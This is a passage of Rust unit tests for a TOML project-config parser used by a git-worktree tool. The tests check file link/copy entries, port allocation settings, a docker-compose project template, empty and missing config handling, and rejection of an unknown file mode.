        // `[ports] base` keys are the PROJECT's service names — never surveyed
        let (_, f) = parse("[ports]\nbase = { WEIRD_NAME = 3000 }\n").unwrap();
        assert!(f.is_empty(), "{f:?}");
    }

    #[test]
    fn project_prefix_parses_but_warns_that_it_is_not_honored() {
        let (c, f) = parse("[project]\nprefix = \"teamx\"\n").unwrap();
        assert!(c.files.is_empty() && c.ports.is_none() && c.compose.is_none());
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].code, Code::DeferredKey);
        assert!(f[0].message.contains("not yet honored"), "{}", f[0].message);
    }

    // ── round-trip + absence ─────────────────────────────────────────────────

    #[test]
    fn a_full_config_round_trips_to_the_expected_struct() {
        let text = r#"
[[file]]
path = ".env"

[[file]]
path = "apps/mobile/google-services.json"

[[file]]
path = "apps/backoffice/.env.local"
mode = "copy"

[ports]
stride = 100
max_slots = 50
base = { BACKOFFICE = 3000, API = 3001, WEBSITE = 3002, WO_MOCK = 3010, META_MOCK = 3011, PG = 5432, LS = 4566 }

[compose]
file = "docker-compose.worktree.yml"
project = "{prefix}-wt-{slug}"
"#;
        let (c, findings) = parse(text).unwrap();
        assert!(findings.is_empty(), "{findings:?}");
        assert_eq!(
            c,
            ProjectConfig {
                files: vec![
                    FileEntry { path: RelPath::parse(".env").unwrap(), mode: Mode::Link },
                    FileEntry {
                        path: RelPath::parse("apps/mobile/google-services.json").unwrap(),
                        mode: Mode::Link,
                    },
                    FileEntry {
                        path: RelPath::parse("apps/backoffice/.env.local").unwrap(),
                        mode: Mode::Copy,
                    },
                ],
                ports: Some(ports(
                    100,
                    50,
                    &[
                        ("API", 3001),
                        ("BACKOFFICE", 3000),
                        ("LS", 4566),
                        ("META_MOCK", 3011),
                        ("PG", 5432),
                        ("WEBSITE", 3002),
                        ("WO_MOCK", 3010),
                    ],
                )),
                compose: Some(Compose {
                    file: RelPath::parse("docker-compose.worktree.yml").unwrap(),
                    project: "{prefix}-wt-{slug}".into(),
                }),
            }
        );
    }

    #[test]
    fn an_empty_config_is_valid_and_declares_nothing() {
        let (c, f) = parse("").unwrap();
        assert_eq!(c, ProjectConfig::default());
        assert!(f.is_empty());
    }

    #[test]
    fn a_missing_file_is_none_not_an_error() {
        // The one filesystem-touching test: a directory that exists and has no
        // config. This is the byte-identical-behavior guarantee (§2.4).
        let dir = std::env::temp_dir().join(format!("wtprojcfg-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let (cfg, findings) = load(&dir).unwrap();
        assert!(cfg.is_none());
        assert!(findings.is_empty());

        std::fs::write(dir.join(CONFIG_FILE), "[[file]]\npath = \".env\"\n").unwrap();
        let (cfg, _) = load(&dir).unwrap();
        assert_eq!(cfg.unwrap().files[0].path.as_str(), ".env");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn mode_only_accepts_link_and_copy() {
        assert_eq!(parse("[[file]]\npath = \".env\"\nmode = \"copy\"\n").unwrap().0.files[0].mode, Mode::Copy);
        let e = parse("[[file]]\npath = \".env\"\nmode = \"hardlink\"\n").unwrap_err();
        assert!(e.to_string().contains("unknown variant `hardlink`"), "{e}");
        assert_eq!(e.line, Some(3));
    }
}
